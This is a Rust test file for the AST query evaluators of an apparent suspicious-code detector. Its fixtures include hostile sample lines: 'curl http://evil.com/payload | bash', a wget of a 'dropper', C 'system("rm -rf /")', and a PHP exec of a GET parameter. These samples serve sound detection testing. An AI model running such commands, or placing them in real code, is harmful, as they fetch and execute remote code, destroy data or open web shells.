//! Test module.
#![allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]

//! Tests for AST-based condition evaluators.

use super::*;
use crate::composite_rules::context::{AnalysisWarning, EvaluationContext};
use crate::composite_rules::types::FileType;
use crate::types::{AnalysisReport, TargetInfo};

fn create_test_report(path: &str) -> AnalysisReport {
    let target = TargetInfo {
        path: path.to_string(),
        file_type: "source".to_string(),
        size_bytes: 1024,
        sha256: "abc123".to_string(),
        architectures: None,
    };
    AnalysisReport::new(target)
}

fn create_test_context<'a>(
    report: &'a AnalysisReport,
    data: &'a [u8],
    file_type: FileType,
) -> EvaluationContext<'a> {
    EvaluationContext::test_only_new(report, data, file_type)
}

/// Parse `source` via filefacts so AST-based tests have a real tree to
/// match against. The returned `ParsedFile` must outlive the
/// `EvaluationContext` the test then builds. The extension hint comes
/// from `path`; pick a name that matches `file_type`.
fn parsed_for_test<'a>(path: &str, source: &'a [u8]) -> filefacts::ParsedFile<'a> {
    let parsed = filefacts::open_with_path(std::path::Path::new(path), source)
        .expect("filefacts::open_with_path");
    let _ = parsed.values(); // prime the parse so source_ast() returns Some
    parsed
}

/// Like [`create_test_context`] but with `cached_ast` populated from
/// a pre-parsed filefacts handle. Use this for any test that exercises
/// AST condition evaluation.
fn create_test_context_with_ast<'a>(
    report: &'a AnalysisReport,
    parsed: &'a filefacts::ParsedFile<'a>,
    data: &'a [u8],
    file_type: FileType,
) -> EvaluationContext<'a> {
    let mut ctx = EvaluationContext::test_only_new(report, data, file_type);
    ctx.cached_ast = parsed.source_ast().map(|a| a.tree);
    ctx
}

/// Count how many times `query_str` matches `tree`.
fn run_query_count(
    lang: &tree_sitter::Language,
    query_str: &str,
    tree: &tree_sitter::Tree,
    src: &[u8],
) -> Option<usize> {
    use streaming_iterator::StreamingIterator;
    let query = tree_sitter::Query::new(lang, query_str).ok()?;
    let mut cursor = tree_sitter::QueryCursor::new();
    let mut count = 0usize;
    let mut matches = cursor.matches(&query, tree.root_node(), src);
    while matches.next().is_some() {
        count += 1;
    }
    Some(count)
}

/// Establishes a baseline: `tree_sitter::Query::new` compiled-and-run from many
/// threads, each with its own query and tree, is deterministic. This PASSES —
/// which RULES OUT bare concurrent compilation as the cause of the parallel
/// archive-analysis finding drift. That bug only reproduces with the shared
/// `QUERY_CACHE` under eviction (see `tests/archive_determinism_test.rs`), so it
/// lives in the cache/eviction/shared-`Arc` interaction, not in `Query::new`
/// itself. Kept as a guard against tree-sitter regressing this property.
#[test]
fn concurrent_query_new_is_deterministic() {
    let source: &[u8] =
        b"function f(){ const a = new Date(); const b = new Date(); const c = new Date(); return a; }";
    let parsed = parsed_for_test("module.js", source);
    let tree = parsed.source_ast().expect("source_ast").tree;
    let lang = tree.language();
    let query_str = "(new_expression) @x";

    let expected = run_query_count(&lang, query_str, tree, source).expect("baseline compile");
    assert!(
        expected >= 3,
        "fixture should yield >=3 new_expression matches, got {expected}"
    );

    const THREADS: usize = 16;
    const ITERS: usize = 400;
    let observed: std::sync::Mutex<std::collections::BTreeSet<Option<usize>>> =
        std::sync::Mutex::new(std::collections::BTreeSet::new());

    std::thread::scope(|scope| {
        for _ in 0..THREADS {
            let observed = &observed;
            let tree_clone = tree.clone();
            scope.spawn(move || {
                // `tree_sitter::Language` is `!Sync`; each thread derives its
                // own from its tree clone. The shared state under test is the
                // grammar the language points to, which `Query::new` reads.
                let lang = tree_clone.language();
                for _ in 0..ITERS {
                    let n = run_query_count(&lang, query_str, &tree_clone, source);
                    observed.lock().expect("mutex").insert(n);
                }
            });
        }
    });

    let observed = observed.into_inner().expect("mutex");
    assert_eq!(
        observed,
        std::collections::BTreeSet::from([Some(expected)]),
        "concurrent Query::new produced inconsistent match counts: {observed:?} \
         (expected every run to be Some({expected}))"
    );
}

#[test]
fn eval_ast_query_caps_total_captures() {
    let mut source = String::new();
    for i in 0..(AST_QUERY_CAPTURE_LIMIT + 100) {
        source.push_str(&format!("a{i};\n"));
    }
    let report = create_test_report("/test/many-identifiers.js");
    let parsed = parsed_for_test("many-identifiers.js", source.as_bytes());
    let ctx =
        create_test_context_with_ast(&report, &parsed, source.as_bytes(), FileType::JavaScript);

    let result = eval_ast(
        None,
        None,
        None,
        None,
        None,
        Some("(identifier) @id"),
        false,
        &ctx,
    );

    assert!(result.matched);
    assert_eq!(result.match_count, AST_QUERY_CAPTURE_LIMIT);
    assert!(
        result
            .warnings
            .iter()
            .any(|w| matches!(w, AnalysisWarning::AstQueryLimited { limit } if *limit == AST_QUERY_CAPTURE_LIMIT)),
        "expected AST query limit warning, got {:?}",
        result.warnings
    );
}

// =============================================================================
// eval_ast tests - Simple mode (kind/node + pattern matching)
// =============================================================================

#[test]
fn test_eval_ast_unsupported_file_type() {
    let report = create_test_report("/test/binary");
    let data = b"binary content";
    let ctx = create_test_context(&report, data, FileType::Elf);

    let result = eval_ast(
        Some("call"),
        None,
        None,
        Some("test"),
        None,
        None,
        false,
        &ctx,
    );

    assert!(!result.matched);
}

#[test]
fn test_eval_ast_python_function_call() {
    let report = create_test_report("/test/script.py");
    let source = r#"
import os
os.system("ls -la")
exec("print('hello')")
"#;
    let parsed = parsed_for_test("script.py", source.as_bytes());
    let ctx = create_test_context_with_ast(&report, &parsed, source.as_bytes(), FileType::Python);

    let result = eval_ast(
        Some("call"),
        None,
        None,
        Some("exec"),
        None,
        None,
        false,
        &ctx,
    );

    assert!(result.matched);
    assert!(!result.evidence.is_empty());
}

#[test]
fn test_eval_ast_python_string_literal() {
    let report = create_test_report("/test/script.py");
    let source = r#"
url = "http://malicious.com/payload"
cmd = "/bin/sh"
"#;
    let parsed = parsed_for_test("script.py", source.as_bytes());
    let ctx = create_test_context_with_ast(&report, &parsed, source.as_bytes(), FileType::Python);

    let result = eval_ast(
        Some("string"),
        None,
        None,
        Some("malicious"),
        None,
        None,
        false,
        &ctx,
    );

    assert!(result.matched);
}

#[test]
fn test_eval_ast_exact_match() {
    let report = create_test_report("/test/script.py");
    let source = r#"
x = "ls"
"#;
    let parsed = parsed_for_test("script.py", source.as_bytes());
    let ctx = create_test_context_with_ast(&report, &parsed, source.as_bytes(), FileType::Python);

    // Note: In Python's AST, the string node includes the quotes: "ls"
    // So we use substr to match the content
    let result = eval_ast(
        Some("string"),
        None,
        None,
        Some("ls"), // substr match
        None,
        None,
        false,
        &ctx,
    );

    assert!(result.matched);
}

#[test]
fn test_eval_ast_regex_match() {
    let report = create_test_report("/test/script.py");
    let source = r#"
password1 = "secret"
password2 = "hunter2"
api_key = "abc123"
"#;
    let parsed = parsed_for_test("script.py", source.as_bytes());
    let ctx = create_test_context_with_ast(&report, &parsed, source.as_bytes(), FileType::Python);

    let result = eval_ast(
        Some("assignment"),
        None,
        None,
        None,
        Some(r"password\d+"),
        None,
        false,
        &ctx,
    );

    assert!(result.matched);
}

#[test]
fn test_eval_ast_case_insensitive() {
    let report = create_test_report("/test/script.py");
    let source = r#"
Password = "SECRET"
"#;
    let parsed = parsed_for_test("script.py", source.as_bytes());
    let ctx = create_test_context_with_ast(&report, &parsed, source.as_bytes(), FileType::Python);

    let result = eval_ast(
        Some("assignment"),
        None,
        None,
        Some("password"),
        None,
        None,
        true, // case insensitive
        &ctx,
    );

    assert!(result.matched);
}

#[test]
fn test_eval_ast_node_type_directly() {
    let report = create_test_report("/test/script.py");
    let source = r#"
x = 42
y = "hello"
"#;
    let parsed = parsed_for_test("script.py", source.as_bytes());
    let ctx = create_test_context_with_ast(&report, &parsed, source.as_bytes(), FileType::Python);

    // Use node parameter instead of kind for direct node type matching
    let result = eval_ast(
        None,
        Some("integer"), // direct tree-sitter node type
        None,
        Some("42"),
        None,
        None,
        false,
        &ctx,
    );

    assert!(result.matched);
}

#[test]
fn test_eval_ast_shell_command() {
    let report = create_test_report("/test/script.sh");
    let source = r#"#!/bin/bash
curl http://evil.com/payload | bash
wget http://malware.com/dropper
"#;
    let parsed = parsed_for_test("script.sh", source.as_bytes());
    let ctx = create_test_context_with_ast(&report, &parsed, source.as_bytes(), FileType::Shell);

    let result = eval_ast(
        Some("call"),
        None,
        None,
        Some("curl"),
        None,
        None,
        false,
        &ctx,
    );

    assert!(result.matched);
}

#[test]
fn test_eval_ast_javascript_function_call() {
    let report = create_test_report("/test/script.js");
    let source = r#"
const code = "malicious";
eval(code);
new Function("return " + code)();
"#;
    let parsed = parsed_for_test("script.js", source.as_bytes());
    let ctx =
        create_test_context_with_ast(&report, &parsed, source.as_bytes(), FileType::JavaScript);

    let result = eval_ast(
        Some("call"),
        None,
        None,
        Some("eval"),
        None,
        None,
        false,
        &ctx,
    );

    assert!(result.matched);
}

#[test]
fn test_eval_ast_go_function_call() {
    let report = create_test_report("/test/main.go");
    let source = r#"
package main

import (
    "os/exec"
)

func main() {
    exec.Command("bash", "-c", "whoami")
}
"#;
    let parsed = parsed_for_test("main.go", source.as_bytes());
    let ctx = create_test_context_with_ast(&report, &parsed, source.as_bytes(), FileType::Go);

    let result = eval_ast(
        Some("call"),
        None,
        None,
        Some("Command"),
        None,
        None,
        false,
        &ctx,
    );

    assert!(result.matched);
}

#[test]
fn test_eval_ast_rust_unsafe_block() {
    let report = create_test_report("/test/main.rs");
    let source = r#"
fn main() {
    unsafe {
        std::ptr::null::<i32>();
    }
}
"#;
    let parsed = parsed_for_test("main.rs", source.as_bytes());
    let ctx = create_test_context_with_ast(&report, &parsed, source.as_bytes(), FileType::Rust);

    let result = eval_ast(
        None,
        Some("unsafe_block"),
        None,
        Some("unsafe"),
        None,
        None,
        false,
        &ctx,
    );

    assert!(result.matched);
}

#[test]
fn test_eval_ast_no_match() {
    let report = create_test_report("/test/script.py");
    let source = r#"
print("hello world")
x = 1 + 2
"#;
    let ctx = create_test_context(&report, source.as_bytes(), FileType::Python);

    let result = eval_ast(
        Some("call"),
        None,
        None,
        Some("exec"),
        None,
        None,
        false,
        &ctx,
    );

    assert!(!result.matched);
}

#[test]
fn test_eval_ast_no_kind_or_node() {
    let report = create_test_report("/test/script.py");
    let source = r#"print("hello")"#;
    let ctx = create_test_context(&report, source.as_bytes(), FileType::Python);

    // No kind or node specified - should return no match
    let result = eval_ast(None, None, None, Some("hello"), None, None, false, &ctx);

    assert!(!result.matched);
}

// =============================================================================
// eval_ast_query tests - Advanced mode (tree-sitter queries)
// =============================================================================

#[test]
fn test_eval_ast_query_python() {
    let report = create_test_report("/test/script.py");
    let source = r#"
import os
os.system("ls")
"#;
    let parsed = parsed_for_test("script.py", source.as_bytes());
    let ctx = create_test_context_with_ast(&report, &parsed, source.as_bytes(), FileType::Python);

    // Tree-sitter query to find os.system calls
    let query = r#"(call
        function: (attribute
            object: (identifier) @obj
            attribute: (identifier) @method)
        (#eq? @obj "os")
        (#eq? @method "system")) @call"#;

    let result = eval_ast(None, None, None, None, None, Some(query), false, &ctx);

    assert!(result.matched);
}

#[test]
fn test_eval_ast_query_javascript() {
    let report = create_test_report("/test/script.js");
    let source = r#"
document.write("<script>evil()</script>");
"#;
    let parsed = parsed_for_test("script.js", source.as_bytes());
    let ctx =
        create_test_context_with_ast(&report, &parsed, source.as_bytes(), FileType::JavaScript);

    // Query for document.write calls
    let query = r#"(call_expression
        function: (member_expression
            object: (identifier) @obj
            property: (property_identifier) @method)
        (#eq? @obj "document")
        (#eq? @method "write")) @call"#;

    let result = eval_ast(None, None, None, None, None, Some(query), false, &ctx);

    assert!(result.matched);
}

#[test]
fn test_eval_ast_query_invalid_syntax() {
    let report = create_test_report("/test/script.py");
    let source = r#"print("hello")"#;
    let ctx = create_test_context(&report, source.as_bytes(), FileType::Python);

    // Invalid query syntax
    let result = eval_ast(
        None,
        None,
        None,
        None,
        None,
        Some("((((invalid query syntax"),
        false,
        &ctx,
    );

    assert!(!result.matched);
}

#[test]
fn test_eval_ast_query_shell() {
    let report = create_test_report("/test/script.sh");
    let source = r#"#!/bin/bash
curl -s http://evil.com | bash
"#;
    let parsed = parsed_for_test("script.sh", source.as_bytes());
    let ctx = create_test_context_with_ast(&report, &parsed, source.as_bytes(), FileType::Shell);

    // Query for pipe to bash
    let query = r#"(pipeline
        (command) @cmd1
        (command
            name: (command_name) @name
            (#eq? @name "bash"))) @pipe"#;

    let result = eval_ast(None, None, None, None, None, Some(query), false, &ctx);

    assert!(result.matched);
}

#[test]
fn test_eval_ast_query_unsupported_file_type() {
    let report = create_test_report("/test/binary");
    let data = b"binary content";
    let ctx = create_test_context(&report, data, FileType::Elf);

    let result = eval_ast(
        None,
        None,
        None,
        None,
        None,
        Some("(identifier) @id"),
        false,
        &ctx,
    );

    assert!(!result.matched);
}

#[test]
fn test_eval_ast_query_no_matches() {
    let report = create_test_report("/test/script.py");
    let source = r#"
x = 1 + 2
print(x)
"#;
    let ctx = create_test_context(&report, source.as_bytes(), FileType::Python);

    // Query for something that doesn't exist
    let query = r#"(call
        function: (attribute
            object: (identifier) @obj
            attribute: (identifier) @method)
        (#eq? @obj "subprocess")
        (#eq? @method "call")) @call"#;

    let result = eval_ast(None, None, None, None, None, Some(query), false, &ctx);

    assert!(!result.matched);
}

// =============================================================================
// Edge cases and error handling
// =============================================================================

#[test]
fn test_eval_ast_invalid_utf8() {
    let report = create_test_report("/test/binary");
    let data = vec![0xff, 0xfe, 0x00, 0x01]; // Invalid UTF-8
    let ctx = create_test_context(&report, &data, FileType::Python);

    let result = eval_ast(
        Some("call"),
        None,
        None,
        Some("test"),
        None,
        None,
        false,
        &ctx,
    );

    assert!(!result.matched);
}

#[test]
fn test_eval_ast_empty_source() {
    let report = create_test_report("/test/script.py");
    let source = "";
    let ctx = create_test_context(&report, source.as_bytes(), FileType::Python);

    let result = eval_ast(
        Some("call"),
        None,
        None,
        Some("exec"),
        None,
        None,
        false,
        &ctx,
    );

    assert!(!result.matched);
}

#[test]
fn test_eval_ast_malformed_source() {
    let report = create_test_report("/test/script.py");
    // Syntactically invalid Python
    let source = r#"
def incomplete(
    x =
"#;
    let ctx = create_test_context(&report, source.as_bytes(), FileType::Python);

    let result = eval_ast(
        Some("call"),
        None,
        None,
        Some("test"),
        None,
        None,
        false,
        &ctx,
    );

    // Should handle parse errors gracefully
    assert!(!result.matched);
    // May have warnings about parse errors
}

#[test]
fn test_eval_ast_evidence_location() {
    let report = create_test_report("/test/script.py");
    let source = r#"
# Line 1
# Line 2
exec("malicious")  # Line 4
"#;
    let parsed = parsed_for_test("script.py", source.as_bytes());
    let ctx = create_test_context_with_ast(&report, &parsed, source.as_bytes(), FileType::Python);

    let result = eval_ast(
        Some("call"),
        None,
        None,
        Some("exec"),
        None,
        None,
        false,
        &ctx,
    );

    assert!(result.matched);
    assert!(!result.evidence.is_empty());
    // Evidence should include line/column location
    let location = result.evidence[0].location.as_ref().unwrap();
    assert!(location.contains(":")); // Format: "line:column"
}

#[test]
fn test_eval_ast_multiple_matches() {
    let report = create_test_report("/test/script.py");
    let source = r#"
exec("cmd1")
exec("cmd2")
exec("cmd3")
"#;
    let parsed = parsed_for_test("script.py", source.as_bytes());
    let ctx = create_test_context_with_ast(&report, &parsed, source.as_bytes(), FileType::Python);

    let result = eval_ast(
        Some("call"),
        None,
        None,
        Some("exec"),
        None,
        None,
        false,
        &ctx,
    );

    assert!(result.matched);
    assert!(result.evidence.len() >= 3);
}

#[test]
fn test_eval_ast_match_count_supports_count_min() {
    // AST conditions return match_count, which is used by count_min/count_max
    // filtering at the TraitDefinition level. Verify match_count is accurate.
    let report = create_test_report("/test/script.py");
    let source = r#"
exec("cmd1")
exec("cmd2")
exec("cmd3")
eval("code1")
exec("cmd4")
"#;
    let parsed = parsed_for_test("script.py", source.as_bytes());
    let ctx = create_test_context_with_ast(&report, &parsed, source.as_bytes(), FileType::Python);

    let result = eval_ast(
        Some("call"),
        None,
        None,
        Some("exec"),
        None,
        None,
        false,
        &ctx,
    );

    assert!(result.matched);
    // match_count must reflect actual AST matches for count_min filtering to work
    assert_eq!(
        result.match_count, 4,
        "match_count should be 4 (one per exec call), got {}",
        result.match_count
    );
}

#[test]
fn test_eval_ast_query_match_count_single() {
    // Verify match_count = 1 when only one AST match exists
    let report = create_test_report("/test/script.py");
    let source = r#"exec("cmd")"#;
    let parsed = parsed_for_test("script.py", source.as_bytes());
    let ctx = create_test_context_with_ast(&report, &parsed, source.as_bytes(), FileType::Python);

    let result = eval_ast(
        Some("call"),
        None,
        None,
        Some("exec"),
        None,
        None,
        false,
        &ctx,
    );

    assert!(result.matched);
    assert_eq!(result.match_count, 1);
}

#[test]
fn test_eval_ast_c_system_call() {
    let report = create_test_report("/test/main.c");
    let source = r#"
#include <stdlib.h>
int main() {
    system("rm -rf /");
    return 0;
}
"#;
    let parsed = parsed_for_test("main.c", source.as_bytes());
    let ctx = create_test_context_with_ast(&report, &parsed, source.as_bytes(), FileType::C);

    let result = eval_ast(
        Some("call"),
        None,
        None,
        Some("system"),
        None,
        None,
        false,
        &ctx,
    );

    assert!(result.matched);
}

#[test]
fn test_eval_ast_php_exec() {
    let report = create_test_report("/test/index.php");
    let source = r#"<?php
$cmd = $_GET['cmd'];
exec($cmd);
?>"#;
    let parsed = parsed_for_test("index.php", source.as_bytes());
    let ctx = create_test_context_with_ast(&report, &parsed, source.as_bytes(), FileType::Php);

    let result = eval_ast(
        Some("call"),
        None,
        None,
        Some("exec"),
        None,
        None,
        false,
        &ctx,
    );

    assert!(result.matched);
}

#[test]
fn test_eval_ast_query_predicates_filter_correctly() {
    // Regression: dashed-ip-colon-regex was matching .replace(/[ \t\r\n]+/g," ")
    // because #eq? and #match? predicates were not filtering correctly.
    // The query should only match .replace(/<regex with colon>/, "-")
    let report = create_test_report("/test/prettify.js");
    let source = r#"ac.replace(/[ \t\r\n]+/g," ")"#;
    let parsed = parsed_for_test("prettify.js", source.as_bytes());
    let ctx =
        create_test_context_with_ast(&report, &parsed, source.as_bytes(), FileType::JavaScript);

    // First, verify the query compiles and predicates are actually recognized.
    // Borrow the language straight off the cached tree — no need to keep a
    // per-grammar dependency in cleave just for this test.
    let lang = parsed
        .source_ast()
        .expect("source_ast for js")
        .tree
        .language();
    let lang = &*lang;
    // WRONG: predicates outside the pattern's closing paren become separate patterns
    let wrong_query = r#"(call_expression
  function: (member_expression
    property: (property_identifier) @prop
  )
  arguments: (arguments
    (regex (regex_pattern) @pat)
    (string (string_fragment) @repl)
  )
)
(#eq? @prop "replace")
(#match? @pat ":")
(#eq? @repl "-")"#;
    let compiled_wrong = tree_sitter::Query::new(lang, wrong_query).expect("query should compile");
    assert_eq!(
        compiled_wrong.pattern_count(),
        4,
        "wrong query has 4 patterns (structural + 3 predicate-only patterns)"
    );

    // CORRECT: predicates inside the pattern's closing paren
    let query_str = r#"(call_expression
  function: (member_expression
    property: (property_identifier) @prop
  )
  arguments: (arguments
    (regex (regex_pattern) @pat)
    (string (string_fragment) @repl)
  )
  (#eq? @prop "replace")
  (#match? @pat ":")
  (#eq? @repl "-")
)"#;
    let compiled = tree_sitter::Query::new(lang, query_str).expect("query should compile");
    assert_eq!(
        compiled.pattern_count(),
        1,
        "correct query should have 1 pattern with predicates inside"
    );

    let result = eval_ast(None, None, None, None, None, Some(query_str), false, &ctx);

    assert!(
        !result.matched,
        "should NOT match .replace(/[ \\t\\r\\n]+/g,\" \") — \
         regex has no colon and replacement is space, not dash. \
         match_count={}, evidence={:?}",
        result.match_count, result.evidence
    );
}

#[test]
fn test_eval_ast_query_predicates_positive_match() {
    // Verify the same query DOES match when the replace has colon regex and dash replacement
    let report = create_test_report("/test/ip.js");
    let source = r#"addr.replace(/:/g,"-")"#;
    let parsed = parsed_for_test("ip.js", source.as_bytes());
    let ctx =
        create_test_context_with_ast(&report, &parsed, source.as_bytes(), FileType::JavaScript);

    let query = r#"(call_expression
  function: (member_expression
    property: (property_identifier) @prop
  )
  arguments: (arguments
    (regex (regex_pattern) @pat)
    (string (string_fragment) @repl)
  )
  (#eq? @prop "replace")
  (#match? @pat ":")
  (#eq? @repl "-")
)"#;

    let result = eval_ast(None, None, None, None, None, Some(query), false, &ctx);

    assert!(
        result.matched,
        "should match .replace(/:/g,\"-\") — regex has colon and replacement is dash"
    );
}

#[test]
fn batch_ast_queries_matches_sequential_eval() {
    let report = create_test_report("/test/script.js");
    let source = r#"
eval("x");
document.write("y");
"#;
    let parsed = parsed_for_test("script.js", source.as_bytes());
    let tree = parsed.source_ast().expect("ast").tree;
    let q_eval = r#"(call_expression
        function: (identifier) @fn
        (#eq? @fn "eval")) @call"#;
    let q_write = r#"(call_expression
        function: (member_expression
            object: (identifier) @obj
            property: (property_identifier) @method)
        (#eq? @obj "document")
        (#eq? @method "write")) @call"#;

    let mut ctx =
        create_test_context_with_ast(&report, &parsed, source.as_bytes(), FileType::JavaScript);
    let sequential_eval = eval_ast(None, None, None, None, None, Some(q_eval), false, &ctx);
    let sequential_write = eval_ast(None, None, None, None, None, Some(q_write), false, &ctx);
    assert!(sequential_eval.matched);
    assert!(sequential_write.matched);

    let batch = batch_ast_queries(
        tree,
        source,
        FileType::JavaScript,
        &[q_eval, q_write],
        None,
        None,
    )
    .expect("two compiling queries should batch");
    assert_eq!(
        batch.get(q_eval).map(|r| (r.matched, r.match_count)),
        Some((sequential_eval.matched, sequential_eval.match_count))
    );
    assert_eq!(
        batch.get(q_write).map(|r| (r.matched, r.match_count)),
        Some((sequential_write.matched, sequential_write.match_count))
    );

    ctx.ast_query_cache = Some(&batch);
    let cached = eval_ast(None, None, None, None, None, Some(q_eval), false, &ctx);
    assert_eq!(cached.match_count, sequential_eval.match_count);
    assert_eq!(cached.matched, sequential_eval.matched);
}

#[test]
fn batch_ast_queries_keeps_text_predicates() {
    let source = r#"addr.replace(/:/g,"-"); eval("z");"#;
    let parsed = parsed_for_test("ip.js", source.as_bytes());
    let tree = parsed.source_ast().expect("ast").tree;
    let q_replace = r#"(call_expression
  function: (member_expression
    property: (property_identifier) @prop
  )
  arguments: (arguments
    (regex (regex_pattern) @pat)
    (string (string_fragment) @repl)
  )
  (#eq? @prop "replace")
  (#match? @pat ":")
  (#eq? @repl "-")
)"#;
    let q_eval = r#"(call_expression
        function: (identifier) @fn
        (#eq? @fn "eval")) @call"#;
    let miss_replace = r#"(call_expression
  function: (member_expression
    property: (property_identifier) @prop
  )
  arguments: (arguments
    (regex (regex_pattern) @pat)
    (string (string_fragment) @repl)
  )
  (#eq? @prop "replace")
  (#match? @pat ":")
  (#eq? @repl "nope")
)"#;

    let batch = batch_ast_queries(
        tree,
        source,
        FileType::JavaScript,
        &[q_replace, q_eval, miss_replace],
        None,
        None,
    )
    .expect("three compiling queries should batch");
    assert!(batch.get(q_replace).is_some_and(|r| r.matched));
    assert!(batch.get(q_eval).is_some_and(|r| r.matched));
    assert!(
        batch.get(miss_replace).is_some_and(|r| !r.matched),
        "combined query must still apply per-pattern #eq?"
    );
}
